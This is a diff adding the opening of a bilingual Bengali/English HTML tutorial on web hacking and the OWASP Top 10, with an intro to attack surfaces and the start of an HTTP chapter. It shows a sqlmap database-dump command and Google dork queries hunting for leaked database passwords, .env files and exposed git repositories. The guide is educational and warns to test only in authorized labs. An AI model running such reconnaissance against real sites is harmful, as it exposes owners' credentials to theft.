@@ -1,0 +1,1933 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Hacking & OWASP Top 10 — সম্পূর্ণ বাংলা গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary: #0d1b2a;
+    --secondary: #1b2838;
+    --accent: #e63946;
+    --green: #2dc653;
+    --yellow: #ffd60a;
+    --blue: #0077b6;
+    --purple: #7b2d8b;
+    --orange: #f4831f;
+    --code-bg: #0d1117;
+    --code-border: #30363d;
+    --text: #1a1a2e;
+    --bg: #f0f2f5;
+    --card: #ffffff;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Hind Siliguri', 'Noto Sans Bengali', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    font-size: 14px;
+    line-height: 1.9;
+  }
+
+  /* ═══ BILINGUAL ═══ */
+  .en-text { display: none; }
+  .bn-text { display: inline; }
+  body.lang-en .bn-text { display: none; }
+  body.lang-en .en-text { display: inline; }
+  .en-block { display: none; }
+  .bn-block { display: block; }
+  body.lang-en .bn-block { display: none; }
+  body.lang-en .en-block { display: block; }
+
+  /* ═══ DARK / LIGHT THEME ═══ */
+  body.light-mode {
+    --bg: #f0f2f5; --card: #ffffff; --text: #1a1a2e;
+    --code-bg: #0d1117; --code-border: #30363d;
+  }
+  body.dark-mode {
+    --bg: #0a0f1a; --card: #111827; --text: #e2e8f0;
+    --code-bg: #050a12; --code-border: #1f2937;
+  }
+  body { background: var(--bg); color: var(--text); transition: background 0.3s, color 0.3s; }
+  body.dark-mode .toc { background: #111827; color: var(--text); }
+  body.dark-mode .chapter { background: #111827; }
+  body.dark-mode .chapter-body { background: #111827; }
+  body.dark-mode h2.sec { color: #a8dadc; }
+  body.dark-mode h3.sub { color: #90cdf4; border-color: #2d3748; }
+  body.dark-mode p { color: var(--text); }
+  body.dark-mode .toc-main { color: #e2e8f0; border-color: #2d3748; }
+  body.dark-mode .toc-header { color: #e2e8f0; }
+  body.dark-mode .toc-sub { color: #94a3b8; }
+  body.dark-mode table { color: var(--text); }
+  body.dark-mode td { border-color: #2d3748; color: var(--text); }
+  body.dark-mode tr:nth-child(even) { background: #1a2332; }
+  body.dark-mode tr:hover { background: #1a3a2a; }
+  body.dark-mode .card { background: #1a2332; border-color: #2d3748; color: var(--text); }
+  body.dark-mode .card h4 { color: #90cdf4; }
+  body.dark-mode .info { background: #0c2340; color: #90cdf4; }
+  body.dark-mode .warn { background: #2a1a00; color: #fbbf24; }
+  body.dark-mode .danger { background: #2a0a0a; color: #fc8181; }
+  body.dark-mode .success { background: #0a2a15; color: #6ee7b7; }
+  body.dark-mode .purple-box { background: #1a0a2a; color: #d8b4fe; }
+  body.dark-mode .hl { background: #2a2000; border-color: #854d0e; color: #fbbf24; }
+  body.dark-mode code { background: #1e293b; color: #93c5fd; }
+  body.dark-mode .diagram { background: #050a12; }
+  body.dark-mode .cheat-card { border-color: #2d3748; }
+  body.dark-mode .cheat-row { border-color: #1f2937; }
+  body.dark-mode .cheat-desc { color: #94a3b8; }
+  body.dark-mode .cheat-cmd { color: #60a5fa; }
+  body.dark-mode .owasp-card { background: #1a2332; border-color: #2d3748; }
+  body.dark-mode .owasp-card p { color: #94a3b8; }
+
+  /* ═══ CONTROLS ═══ */
+  .top-controls {
+    position: fixed; top: 20px; right: 20px;
+    display: flex; gap: 10px; z-index: 9999; align-items: center;
+    flex-wrap: wrap; justify-content: flex-end;
+  }
+  .ctrl-btn {
+    border: none; padding: 10px 18px; border-radius: 8px;
+    font-size: 13px; font-family: inherit; cursor: pointer;
+    transition: all 0.3s; font-weight: 700;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  }
+  .lang-btn { background: #0077b6; color: white; }
+  .lang-btn:hover { background: #005f8e; transform: translateY(-2px); }
+  .theme-btn { background: #2dc653; color: #0d1b2a; }
+  .theme-btn:hover { background: #25a344; transform: translateY(-2px); }
+  .print-btn { background: var(--accent); color: white; }
+  .print-btn:hover { background: #c1121f; transform: translateY(-2px); }
+
+  /* ═══ COVER ═══ */
+  .cover {
+    background: linear-gradient(135deg, #0d1b2a 0%, #0f3460 50%, #16213e 100%);
+    color: white; min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    text-align: center; padding: 60px 40px;
+    page-break-after: always; position: relative; overflow: hidden;
+  }
+  .cover::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg, transparent, transparent 30px,
+      rgba(0,119,182,0.04) 30px, rgba(0,119,182,0.04) 31px
+    );
+  }
+  .cover-icon { font-size: 90px; margin-bottom: 20px; position: relative; animation: float 3s ease-in-out infinite; }
+  @keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-12px)} }
+  .cover h1 { font-size: 40px; font-weight: 700; color: #e63946; text-shadow: 0 0 30px rgba(230,57,70,0.5); }
+  .cover h2 { font-size: 22px; font-weight: 400; opacity: 0.8; margin: 10px 0 25px; }
+  .cover .divider { width: 120px; height: 3px; background: var(--blue); margin: 20px auto; border-radius: 2px; }
+  .cover .desc { font-size: 15px; opacity: 0.7; max-width: 650px; line-height: 2; }
+  .cover .badges { margin-top: 30px; }
+  .cover .badge {
+    display: inline-block; background: rgba(0,119,182,0.15);
+    border: 1px solid rgba(0,119,182,0.4); padding: 6px 18px;
+    border-radius: 20px; margin: 5px; font-size: 13px; color: #90e0ef;
+  }
+  .cover .terminal {
+    background: rgba(0,0,0,0.5); border: 1px solid rgba(230,57,70,0.3);
+    border-radius: 10px; padding: 20px 30px; margin-top: 30px;
+    font-family: 'Courier New', monospace; font-size: 13px;
+    color: #e63946; text-align: left; max-width: 520px;
+  }
+  .cover .terminal .prompt { color: #89b4fa; }
+  .cover .terminal .ok { color: #2dc653; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+  /* ═══ TOC ═══ */
+  .toc { background: white; padding: 50px 60px; page-break-after: always; }
+  .toc-header { font-size: 30px; color: var(--primary); border-bottom: 4px solid var(--accent); padding-bottom: 15px; margin-bottom: 35px; }
+  .toc-chapter { margin-bottom: 5px; }
+  .toc-main { display: flex; justify-content: space-between; padding: 10px 0; font-weight: 700; font-size: 16px; color: var(--primary); border-bottom: 1px solid #eee; margin-top: 15px; }
+  .toc-main .num { color: var(--accent); margin-right: 10px; }
+  .toc-sub { display: flex; justify-content: space-between; padding: 5px 0 5px 30px; color: #666; font-size: 13.5px; border-bottom: 1px dotted #f0f0f0; }
+
+  /* ═══ CHAPTERS ═══ */
+  .chapter { background: white; margin: 0; page-break-before: always; }
+  .chapter-header { padding: 40px 55px; position: relative; overflow: hidden; }
+  .ch-intro .chapter-header { background: linear-gradient(135deg, #0d1b2a, #0f3460); }
+  .ch-http .chapter-header { background: linear-gradient(135deg, #1b2838, #0f3460); }
+  .ch-owasp .chapter-header { background: linear-gradient(135deg, #4a0000, #8b0000); }
+  .ch-sqli .chapter-header { background: linear-gradient(135deg, #1a0d26, #3d1f5c); }
+  .ch-xss .chapter-header { background: linear-gradient(135deg, #0d2818, #1a4731); }
+  .ch-auth .chapter-header { background: linear-gradient(135deg, #1a1000, #3d2800); }
+  .ch-tools .chapter-header { background: linear-gradient(135deg, #0d1b2a, #1b3a4b); }
+  .ch-defense .chapter-header { background: linear-gradient(135deg, #0d2818, #1a4731); }
+  .ch-roadmap .chapter-header { background: linear-gradient(135deg, #0d1b2a, #1b2838); }
+  .ch-cheat .chapter-header { background: linear-gradient(135deg, #2d1b69, #3d2b8e); }
+  .ch-compare .chapter-header { background: linear-gradient(135deg, #1b0000, #4a0000); }
+
+  .chapter-header::after {
+    content: ''; position: absolute; top: -30px; right: -30px;
+    width: 150px; height: 150px; border-radius: 50%;
+    background: rgba(255,255,255,0.03);
+  }
+  .chapter-label { font-size: 11px; letter-spacing: 4px; color: #e63946; text-transform: uppercase; margin-bottom: 10px; }
+  .chapter-title { font-size: 30px; color: white; font-weight: 700; }
+  .chapter-desc { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 8px; }
+  .chapter-body { padding: 40px 55px; }
+
+  /* ═══ HEADINGS ═══ */
+  h2.sec { font-size: 22px; color: var(--primary); margin: 35px 0 15px; padding-left: 18px; border-left: 5px solid var(--accent); }
+  h3.sub { font-size: 17px; color: #1b3a4b; margin: 25px 0 12px; padding-bottom: 6px; border-bottom: 2px dashed #e0e0e0; }
+  h4.mini { font-size: 15px; color: #333; margin: 18px 0 8px; font-weight: 600; }
+  p { margin-bottom: 14px; text-align: justify; }
+  ul, ol { margin: 12px 0 12px 25px; line-height: 2; }
+  li { margin-bottom: 4px; }
+
+  /* ═══ CODE ═══ */
+  .code {
+    background: var(--code-bg); color: #c9d1d9;
+    padding: 20px 25px; border-radius: 10px;
+    font-family: 'Courier New', monospace; font-size: 13px;
+    margin: 18px 0; line-height: 1.8; overflow-x: auto;
+    border: 1px solid var(--code-border);
+    border-left: 4px solid var(--accent);
+  }
+  .code .c { color: #6e7681; }
+  .code .k { color: #ff7b72; }
+  .code .s { color: #a5d6ff; }
+  .code .p { color: #f0883e; }
+  .code .g { color: var(--green); }
+  .code .y { color: #e3b341; }
+  .code .r { color: #ff7b72; }
+  .code .bl { color: #79c0ff; }
+  code { background: #1b2838; color: #f87171; padding: 2px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 13px; }
+
+  /* ═══ BOXES ═══ */
+  .box { padding: 18px 22px; border-radius: 10px; margin: 20px 0; border-left: 5px solid; }
+  .info { background: #e8f4fd; border-color: #0077b6; color: #023e8a; }
+  .warn { background: #fff8e6; border-color: #f4831f; color: #7b3f00; }
+  .danger { background: #fde8ea; border-color: #e63946; color: #9b1d20; }
+  .success { background: #e8f8ed; border-color: #2dc653; color: #1a4731; }
+  .purple-box { background: #f3e8ff; border-color: #7b2d8b; color: #4a0072; }
+  .box-t { font-weight: 700; margin-bottom: 8px; font-size: 15px; }
+
+  /* ═══ TABLES ═══ */
+  table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 13.5px; }
+  thead tr { background: var(--primary); color: white; }
+  th { padding: 12px 15px; text-align: left; font-weight: 600; }
+  td { padding: 10px 15px; border-bottom: 1px solid #eee; }
+  tr:nth-child(even) { background: #f8f9fa; }
+  tr:hover { background: #fde8ea; }
+
+  /* ═══ DIAGRAM ═══ */
+  .diagram {
+    background: #0d1117; border: 1px solid #30363d;
+    border-radius: 10px; padding: 22px; font-family: 'Courier New', monospace;
+    font-size: 13px; line-height: 1.9; margin: 20px 0; color: #c9d1d9; overflow-x: auto;
+  }
+  .diagram .dg { color: var(--green); }
+  .diagram .dy { color: #e3b341; }
+  .diagram .db { color: #79c0ff; }
+  .diagram .dr { color: #ff7b72; }
+
+  /* ═══ GRID ═══ */
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; margin: 20px 0; }
+  .grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin: 20px 0; }
+  .card { background: #f8f9fa; border: 1px solid #e0e0e0; border-radius: 10px; padding: 18px; }
+  .card h4 { color: var(--primary); margin-bottom: 10px; font-size: 15px; border-bottom: 2px solid var(--accent); padding-bottom: 6px; }
+  .card.danger-card { border-color: var(--accent); }
+  .card.danger-card h4 { color: var(--accent); border-color: var(--accent); }
+  .card.success-card { border-color: var(--green); }
+  .card.success-card h4 { color: #1a4731; border-color: var(--green); }
+  .card.blue-card { border-color: var(--blue); }
+  .card.blue-card h4 { color: var(--blue); border-color: var(--blue); }
+
+  /* ═══ OWASP CARDS ═══ */
+  .owasp-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 24px 0; }
+  .owasp-card {
+    background: white; border: 1px solid #e0e0e0; border-radius: 12px;
+    overflow: hidden; transition: transform 0.2s;
+  }
+  .owasp-card:hover { transform: translateY(-3px); }
+  .owasp-card-header {
+    padding: 12px 18px; display: flex; align-items: center; gap: 12px;
+  }
+  .owasp-rank {
+    width: 36px; height: 36px; border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 800; font-size: 15px; color: white; flex-shrink: 0;
+  }
+  .owasp-card-title { font-weight: 700; font-size: 14px; color: white; }
+  .owasp-card-body { padding: 14px 18px; }
+  .owasp-card p { font-size: 13px; color: #555; margin-bottom: 10px; text-align: left; }
+  .owasp-tags { display: flex; flex-wrap: wrap; gap: 6px; }
+  .owasp-tag { padding: 3px 10px; border-radius: 12px; font-size: 11.5px; font-weight: 600; }
+
+  /* ═══ BADGE ═══ */
+  .badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 600; margin: 2px; }
+  .badge-g { background: #d1e7dd; color: #0f5132; }
+  .badge-r { background: #fde8ea; color: #c1121f; }
+  .badge-y { background: #fff3cd; color: #856404; }
+  .badge-b { background: #cfe2ff; color: #084298; }
+  .badge-p { background: #f3e8ff; color: #4a0072; }
+
+  /* ═══ SEVERITY ═══ */
+  .sev-critical { background: #7f0000; color: white; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 700; }
+  .sev-high { background: #c1121f; color: white; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 700; }
+  .sev-medium { background: #f4831f; color: white; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 700; }
+  .sev-low { background: #ffd60a; color: #333; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 700; }
+
+  /* ═══ HIGHLIGHT ═══ */
+  .hl { background: linear-gradient(135deg, #fff9c4, #fff3e0); border: 1px solid #ffd60a; padding: 15px 20px; border-radius: 8px; margin: 18px 0; }
+  .chapter-summary { background: linear-gradient(135deg, #0d1b2a, #1b2838); color: white; border-radius: 12px; padding: 25px 30px; margin-top: 40px; }
+  .chapter-summary h3 { color: #e63946; margin-bottom: 15px; font-size: 18px; }
+  .chapter-summary li { color: rgba(255,255,255,0.85); margin-bottom: 6px; }
+
+  /* ═══ CHEAT SHEET ═══ */
+  .cheat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 20px 0; }
+  .cheat-card { background: var(--card); border: 1px solid #e0e0e0; border-radius: 10px; overflow: hidden; }
+  .cheat-card-header { padding: 10px 16px; font-weight: 700; font-size: 14px; color: white; }
+  .cheat-row { display: flex; padding: 6px 14px; border-bottom: 1px solid #f0f0f0; font-size: 12.5px; gap: 12px; align-items: flex-start; }
+  .cheat-row:last-child { border-bottom: none; }
+  .cheat-cmd { font-family: 'Courier New', monospace; color: #e63946; font-weight: 600; min-width: 170px; white-space: nowrap; font-size: 12px; }
+  .cheat-desc { color: #555; }
+
+  /* ═══ ROADMAP ═══ */
+  .roadmap-container { padding: 20px 0; }
+  .roadmap-phase { display: flex; gap: 20px; margin-bottom: 30px; align-items: flex-start; }
+  .phase-number {
+    min-width: 52px; height: 52px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px; font-weight: 800; color: white; flex-shrink: 0;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+  }
+  .phase-content { flex: 1; }
+  .phase-title { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+  .phase-desc { font-size: 13.5px; color: #555; margin-bottom: 10px; }
+  body.dark-mode .phase-desc { color: #94a3b8; }
+  .phase-items { display: flex; flex-wrap: wrap; gap: 8px; }
+  .phase-item { padding: 5px 14px; border-radius: 20px; font-size: 12.5px; font-weight: 600; border: 1.5px solid currentColor; }
+  .roadmap-arrow { text-align: center; font-size: 28px; color: var(--accent); margin: -15px 0 10px 26px; }
+
+  @media (max-width: 768px) {
+    .owasp-grid, .cheat-grid, .grid2, .grid3 { grid-template-columns: 1fr; }
+    .chapter-body { padding: 25px 20px; }
+    .toc { padding: 30px 20px; }
+  }
+  @media print { .top-controls { display: none; } body { background: white; } }
+</style>
+</head>
+<body class="light-mode">
+
+<!-- Controls -->
+<div class="top-controls">
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()" id="langBtn">🇬🇧 English</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark Mode</button>
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+</div>
+
+<!-- ══════════════════ COVER ══════════════════ -->
+<div class="cover">
+  <div class="cover-icon">🕷️</div>
+  <h1>Web Hacking & Application Security</h1>
+  <h2><span class="bn-text">OWASP Top 10 সহ সম্পূর্ণ বাংলা গাইড</span><span class="en-text">Complete Guide with OWASP Top 10</span></h2>
+  <div class="divider"></div>
+  <p class="desc"><span class="bn-text">HTTP ব্যাসিক থেকে শুরু করে SQL Injection, XSS, CSRF, SSRF, Authentication Bypass — Web Security-তে যা যা দরকার সব এক জায়গায়।</span><span class="en-text">From HTTP basics to SQL Injection, XSS, CSRF, SSRF, Authentication Bypass — everything you need for Web Security in one place.</span></p>
+  <div class="terminal">
+    <div><span class="prompt">hacker@kali</span>:~# <span class="ok">sqlmap</span> -u "http://target.com/?id=1" --dbs</div>
+    <div style="color:#ffd60a">[*] starting @ 13:37:00</div>
+    <div style="color:#2dc653">[+] the back-end DBMS is MySQL</div>
+    <div style="color:#2dc653">[+] fetching database names</div>
+    <div style="color:#fff">[*] information_schema</div>
+    <div style="color:#fff">[*] secret_database ← 🎯</div>
+    <div style="animation: blink 1s infinite; color:#e63946;">█</div>
+  </div>
+  <div class="badges">
+    <span class="badge">🔴 OWASP Top 10</span>
+    <span class="badge">💉 SQL Injection</span>
+    <span class="badge">📜 XSS</span>
+    <span class="badge">🔐 Auth Attacks</span>
+    <span class="badge">🌐 HTTP Deep Dive</span>
+    <span class="badge">🔧 Burp Suite</span>
+    <span class="badge">🛡️ Web Hardening</span>
+    <span class="badge">📋 Cheat Sheet</span>
+    <span class="badge">🗺️ Roadmap</span>
+  </div>
+</div>
+
+<!-- ══════════════════ TOC ══════════════════ -->
+<div class="toc">
+  <div class="toc-header">📋 <span class="bn-text">বিষয়সূচি</span><span class="en-text">Table of Contents</span></div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০১</span> <span class="bn-text">Web Security পরিচিতি</span><span class="en-text">Introduction to Web Security</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Web Application কীভাবে কাজ করে, Client-Server Model</span><span class="en-text">How web applications work, Client-Server Model</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Frontend, Backend, Database — Attack Surface</span><span class="en-text">Frontend, Backend, Database — Attack Surface</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০২</span> HTTP Protocol <span class="bn-text">বিস্তারিত</span><span class="en-text">in Detail</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Request/Response Structure, Methods, Status Codes</span><span class="en-text">Request/Response Structure, Methods, Status Codes</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Headers, Cookies, Sessions — Security Context</span><span class="en-text">Headers, Cookies, Sessions — Security Context</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৩</span> OWASP Top 10 (2021) — <span class="bn-text">সম্পূর্ণ</span><span class="en-text">Complete</span></span></div>
+    <div class="toc-sub"><span>A01: Broken Access Control, A02: Cryptographic Failures</span></div>
+    <div class="toc-sub"><span>A03: Injection, A04: Insecure Design, A05: Security Misconfiguration</span></div>
+    <div class="toc-sub"><span>A06-A10: <span class="bn-text">বাকি সব দুর্বলতা</span><span class="en-text">Remaining vulnerabilities</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৪</span> SQL Injection — <span class="bn-text">বিস্তারিত</span><span class="en-text">In Detail</span></span></div>
+    <div class="toc-sub"><span>In-band, Blind, Time-based SQLi</span></div>
+    <div class="toc-sub"><span>SQLmap, Manual Exploitation, Bypass Techniques</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৫</span> Cross-Site Scripting (XSS)</span></div>
+    <div class="toc-sub"><span>Reflected, Stored, DOM-based XSS</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Payload, Cookie Steal, BeEF</span><span class="en-text">Payloads, Cookie Steal, BeEF</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৬</span> <span class="bn-text">Authentication ও Session Attack</span><span class="en-text">Authentication & Session Attacks</span></span></div>
+    <div class="toc-sub"><span>Brute Force, Credential Stuffing, Session Hijacking</span></div>
+    <div class="toc-sub"><span>CSRF, JWT Attack, Password Reset Flaws</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৭</span> <span class="bn-text">Web Hacking টুলস</span><span class="en-text">Web Hacking Tools</span></span></div>
+    <div class="toc-sub"><span>Burp Suite, SQLmap, Nikto, Gobuster, FFUF</span></div>
+    <div class="toc-sub"><span>OWASP ZAP, Wfuzz, Dirb, Hydra (Web)</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৮</span> Web Application <span class="bn-text">হার্ডেনিং</span><span class="en-text">Hardening</span></span></div>
+    <div class="toc-sub"><span>Security Headers, Input Validation, WAF</span></div>
+    <div class="toc-sub"><span>HTTPS, CSP, CORS Policy</span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৯</span> Web Security Roadmap</span></div>
+    <div class="toc-sub"><span><span class="bn-text">শূন্য থেকে Bug Bounty Hunter পর্যন্ত</span><span class="en-text">From zero to Bug Bounty Hunter</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১০</span> Quick Cheat Sheet</span></div>
+    <div class="toc-sub"><span><span class="bn-text">সব গুরুত্বপূর্ণ payload ও কমান্ড এক জায়গায়</span><span class="en-text">All important payloads and commands in one place</span></span></div>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১১</span> Tools Comparison</span></div>
+    <div class="toc-sub"><span><span class="bn-text">কোন কাজে কোন টুল — পাশাপাশি তুলনা</span><span class="en-text">Which tool for which task — side by side comparison</span></span></div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 01: INTRO ══════════════════ -->
+<div class="chapter ch-intro">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 01</div>
+    <div class="chapter-title">🌐 <span class="bn-text">Web Security পরিচিতি</span><span class="en-text">Introduction to Web Security</span></div>
+    <div class="chapter-desc"><span class="bn-text">Web Application কীভাবে কাজ করে এবং কোথায় আক্রমণ হয়</span><span class="en-text">How web applications work and where attacks happen</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Web Application কীভাবে কাজ করে?</span><span class="en-text">How Does a Web Application Work?</span></h2>
+    <p><span class="bn-text">একটি web application মূলত তিনটি স্তরে কাজ করে — Frontend (Browser), Backend (Server) এবং Database। প্রতিটি স্তরে আলাদা আলাদা দুর্বলতা থাকতে পারে।</span><span class="en-text">A web application works in three layers — Frontend (Browser), Backend (Server), and Database. Each layer can have its own vulnerabilities.</span></p>
+
+    <div class="diagram">
+<pre>
+<span class="db">Browser (Client)</span>          <span class="dy">Web Server (Backend)</span>       <span class="dr">Database</span>
+┌─────────────────┐         ┌──────────────────────┐      ┌──────────────┐
+│                 │  HTTP   │                      │ SQL  │              │
+│  HTML/CSS/JS    │ ──────► │  PHP / Python / Node │ ───► │  MySQL       │
+│  (User দেখে)    │ ◄────── │  (Logic চলে)         │ ◄─── │  PostgreSQL  │
+│                 │ Response│                      │ Data │  MongoDB     │
+└─────────────────┘         └──────────────────────┘      └──────────────┘
+       ↑                            ↑                             ↑
+<span class="dr">XSS, CSRF</span>               <span class="dr">SQLi, SSRF, RCE</span>           <span class="dr">SQL Injection</span>
+<span class="dr">Clickjacking</span>             <span class="dr">Path Traversal</span>             <span class="dr">Data Breach</span>
+</pre>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Attack Surface — কোথায় আক্রমণ হয়?</span><span class="en-text">Attack Surface — Where Do Attacks Happen?</span></h2>
+    <div class="grid3">
+      <div class="card danger-card">
+        <h4>🖥️ Frontend</h4>
+        <ul>
+          <li>XSS (Script Injection)</li>
+          <li>Clickjacking</li>
+          <li>CSRF</li>
+          <li><span class="bn-text">DOM Manipulation</span><span class="en-text">DOM Manipulation</span></li>
+          <li>Open Redirect</li>
+        </ul>
+      </div>
+      <div class="card danger-card">
+        <h4>⚙️ Backend</h4>
+        <ul>
+          <li>SQL / Command Injection</li>
+          <li>SSRF</li>
+          <li>Path Traversal</li>
+          <li>RCE (Remote Code Exec)</li>
+          <li>Auth Bypass</li>
+        </ul>
+      </div>
+      <div class="card danger-card">
+        <h4>🗄️ Database</h4>
+        <ul>
+          <li>SQL Injection</li>
+          <li><span class="bn-text">Plain text password</span><span class="en-text">Plain text passwords</span></li>
+          <li>NoSQL Injection</li>
+          <li><span class="bn-text">Sensitive data leak</span><span class="en-text">Sensitive data leaks</span></li>
+          <li>Privilege escalation</li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Hacker কীভাবে ভাবে?</span><span class="en-text">How Does a Hacker Think?</span></h2>
+    <div class="diagram">
+<pre>
+<span class="dy">Reconnaissance</span>  →  <span class="db">Scanning</span>  →  <span class="dr">Exploitation</span>  →  <span class="dr">Post-Exploit</span>
+
+<span class="dy">তথ্য সংগ্রহ</span>              <span class="db">দুর্বলতা খোঁজা</span>    <span class="dr">আক্রমণ করা</span>       <span class="dr">Data চুরি</span>
+
+  whois                 Nikto             SQLmap          Data dump
+  subfinder             Gobuster          Burp Suite      Shell upload
+  Google Dork           Nmap              Manual XSS      Pivot
+  Shodan                FFUF              Hydra           Persist
+</pre>
+    </div>
+
+    <h2 class="sec">Google Dork — <span class="bn-text">তথ্য খোঁজার কৌশল</span><span class="en-text">Information Finding Techniques</span></h2>
+    <div class="code">
+<span class="c"># Google-এ বিশেষ operator দিয়ে sensitive তথ্য খোঁজা</span>
+site:target.com               <span class="c"># <span class="bn-text">শুধু target.com-এর পেজ</span><span class="en-text">Only pages from target.com</span></span>
+site:target.com filetype:pdf  <span class="c"># <span class="bn-text">সব PDF ফাইল</span><span class="en-text">All PDF files</span></span>
+site:target.com inurl:admin   <span class="c"># <span class="bn-text">URL-এ admin আছে এমন</span><span class="en-text">Pages with admin in URL</span></span>
+site:target.com intitle:login <span class="c"># <span class="bn-text">Login page</span><span class="en-text">Login pages</span></span>
+site:target.com ext:php inurl:?  <span class="c"># <span class="bn-text">PHP page with parameters</span><span class="en-text">PHP pages with parameters</span></span>
+
+<span class="c"># ⭐ Sensitive info leak</span>
+site:target.com "password"    <span class="c"># <span class="bn-text">password শব্দ আছে এমন পেজ</span><span class="en-text">Pages containing the word password</span></span>
+site:target.com "DB_PASSWORD" <span class="c"># <span class="bn-text">Database credentials</span><span class="en-text">Database credentials</span></span>
+inurl:".git" site:target.com  <span class="c"># <span class="bn-text">Exposed git repository</span><span class="en-text">Exposed git repository</span></span>
+filetype:env "DB_PASSWORD"    <span class="c"># <span class="bn-text">.env ফাইল expose</span><span class="en-text">.env file exposed</span></span>
+intitle:"index of" "config"   <span class="c"># <span class="bn-text">Open directory listing</span><span class="en-text">Open directory listing</span></span>
+    </div>
+
+    <div class="box warn">
+      <div class="box-t">⚠️ <span class="bn-text">গুরুত্বপূর্ণ সতর্কতা</span><span class="en-text">Important Warning</span></div>
+      <span class="bn-text">সব কিছু শুধুমাত্র authorized environment-এ practice করো। CTF, TryHackMe, HackTheBox, নিজের lab — এর বাইরে কোনো real website-এ test করা illegal।</span>
+      <span class="en-text">Practice everything only in authorized environments. CTF, TryHackMe, HackTheBox, your own lab — testing on real websites outside these is illegal.</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🎯 <span class="bn-text">সারসংক্ষেপ</span><span class="en-text">Summary</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">Web app = Frontend + Backend + Database — তিন জায়গাতেই দুর্বলতা থাকে</span><span class="en-text">Web app = Frontend + Backend + Database — vulnerabilities exist in all three</span></li>
+        <li>✅ <span class="bn-text">হ্যাকার প্রথমে তথ্য সংগ্রহ করে, তারপর attack করে</span><span class="en-text">Hackers gather information first, then attack</span></li>
+        <li>✅ Google Dork <span class="bn-text">দিয়ে অনেক sensitive তথ্য পাওয়া যায়</span><span class="en-text">can reveal lots of sensitive information</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 02: HTTP ══════════════════ -->
+<div class="chapter ch-http">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 02</div>
+    <div class="chapter-title">🌐 HTTP Protocol <span class="bn-text">বিস্তারিত</span><span class="en-text">in Detail</span></div>
+    <div class="chapter-desc"><span class="bn-text">Security-র দৃষ্টিকোণ থেকে HTTP বোঝা</span><span class="en-text">Understanding HTTP from a security perspective</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">HTTP Request <span class="bn-text">স্ট্রাকচার</span><span class="en-text">Structure</span></h2>
+    <div class="code">
+<span class="c"># একটি সম্পূর্ণ HTTP Request:</span>
+<span class="g">POST /login HTTP/1.1</span>                   <span class="c"># Method + Path + Version</span>
+<span class="bl">Host:</span> target.com                         <span class="c"># <span class="bn-text">কোন server-এ যাবে</span><span class="en-text">Which server to reach</span></span>
+<span class="bl">Content-Type:</span> application/x-www-form-urlencoded
+<span class="bl">Content-Length:</span> 27
